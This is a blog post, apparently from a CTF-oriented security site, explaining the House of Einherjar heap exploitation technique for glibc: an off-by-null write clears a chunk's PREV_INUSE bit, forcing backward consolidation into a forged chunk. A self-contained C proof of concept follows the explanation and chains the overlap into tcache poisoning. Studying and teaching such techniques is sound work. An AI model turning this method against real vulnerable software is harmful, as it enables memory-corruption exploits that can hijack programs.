---
title: House of Einherjar
date: 2025-07-07 19:00:00 + 0530
categories: [Concept, Heap]
tags: [pwn, heap, theory]     # TAG names should always be lowercase
math: true
---

## How it works

- House of Einherjar is a go-to method for heap exploitation in case of **a single NULL byte overflow** vulnerability.
- It can be used to obtain overlapping chunks
- Which can further be used to launch other attacks (like tcache poisoning, demonstrated in PoC below)

---

- The idea is that we would have three consecutive chunks
  - `fake` : used to store a fake chunk
  - `middle`: this is used for two purposes:
    1. To use the off-by-bull vulnerability and write `\x00` into next chunk
    2. As the "overlapped" chunk after the attack
  - `victim`: this chunk will be overwritten by the `\x00` from `middle`

![Desktop View](/assets/img/ac2ca82df0bdc7bcee455ea941af096984f22d21ce29d147ee3bfab62a7af912.svg)
_Before corruption_

- We start by forging the fake chunk by setting its fields as:
  - `prev_size = 0`
  - `size = (will discuss later)`
  - `next = &fake`
  - `prev = &fake`

> The `next` and `prev` fields are set to point to itself for the unlinking to happen successfully
{: .prompt-info }

- Then use `middle` to write the same `size` in the `victim`'s `prev_size` field
- Then finally we use the off-by-null vulnerability to write `\x00` in the `victim`'s size field
- In our case the `size` was `0x101` (with the `PREV_INUSE` bit set)

![Desktop View](/assets/img/9e438c1edad3051517757bdcbce0fceb7b227a9525905c29cd7ffdb3e3800351.svg)
_After corruption_

- And after overwriting it becomes `0x100` => the `PREV_INUSE` field gets cleared

> This is why it's ideal if the size of `victim` is a multiple of `0x100`
{: .prompt-info }

- This tricks the allocator algorithm. If you free `victim` now, the algorithm will think that `prev_size` bytes behind there is a free chunk, so it makes sense for `victim` to consolidate backwards and insert it into the smallbin.

> Typically on freeing `victim` it should land in tcache which does not perform any consolidation, hence you should fill tcache just before calling `free(victim)`
{: .prompt-warning }

- But before that happens, the previous chunk needs to be "unlinked" from the doubly circular linked list of smallbin. The pointers are validated while unlinking. That is, the previous chunk must satisfy `chunk->prev = chunk->next = chunk` (hence the pointers are set to point to itself)
- I think it's obvious now what the `size` must be: `&victim - &fake - 0x10` (-0x10 to adjust for headers)
- So all in all, this is what happens to the heap after free:

![Desktop View](/assets/img/0878b69a06c66879354adb36ab5cb404803cb6ef785ce53845dde0344759554a.svg)
_After consolidation_

- As you can see, the heap thinks that there is a `0x140` bytes chunk available @ our fake chunk address, and it will gladly return us this memory when requested
- So we technically "own" the entire 0x140 bytes from the start of fake chunk
- This includes (overlaps) with the `middle` chunk entirely
- This is where the `middle` chunk's headers/data can be manipulated to launch other attacks

## PoC

```c
/**
 * Author: VulnX <vulnx101@gmail.com>
 * Description: PoC for House of Einherjar attack
 *
 * How to compile and run:
 *   gcc einherjar.c -o einherjar -g && ./einherjar
 *
 * Expected output:
 *   TARGET ACHIEVED
 */
#include <assert.h>
#include <malloc.h>
#include <stddef.h>
#include <stdlib.h>

struct fake_chunk {
  size_t prev_size;
  size_t size;
  void *next;
  void *prev;
};

void fill_tcache(size_t size) {
  void *chunks[7];
  for (int i = 0; i < 7; i++) {
    chunks[i] = malloc(size);
  }
  for (int i = 0; i < 7; i++) {
    free(chunks[i]);
  }
}

size_t mangle(void *ptr, void *addr) {
  return (size_t)ptr ^ ((size_t)addr >> 12);
}

int main() {
  void *target;
  struct fake_chunk *fake = malloc(sizeof(struct fake_chunk));
  fake->prev_size = 0;
  fake->next = fake;
  fake->prev = fake;
  void *middle = malloc(0x20 - 8);  // minimum sized allocation
  void *victim = malloc(0x100 - 8); // Preferably a multiple of 0x100
  size_t size_difference = victim - (void *)fake - 0x10;

  *(size_t *)(middle + malloc_usable_size(middle) - sizeof(void *)) =
      size_difference; // victim->prev_size = size_difference
  // -- start vuln
  *(char *)(middle + malloc_usable_size(middle)) =
      '\0'; // clear PREV_INUSE bit from victim via OOB write
  // -- end vuln
  fake->size = size_difference; // Ensure fake->size == victim->prev_size ==
                                // size_difference

  // fill tcache so that victim lands in smallbin *after* consolidating
  // backwards
  fill_tcache(0x100 - 8);
  free(victim);

  size_t consolidated_size = 0x100 + size_difference;
  void *overlap = malloc(consolidated_size - 8);

  assert(overlap - 0x10 == fake); // overlap now *contains* middle inside it

  // -- normal tcache poisoning
  void *another = malloc(0x20 - 8);
  free(another);
  free(middle);
  void *target_addr =
      (((size_t)&target & 0xf) == 0) ? &target : (void *)&target + 0x8;
  *(size_t *)(overlap + malloc_usable_size(fake) + sizeof(void *) - 0x10) =
      mangle(target_addr, middle);
  void *obtained = malloc(0x20 - 8);
  obtained = malloc(0x20 - 8);

  assert(obtained == target_addr);

  puts("TARGET ACHIEVED");

  return 0;
}
```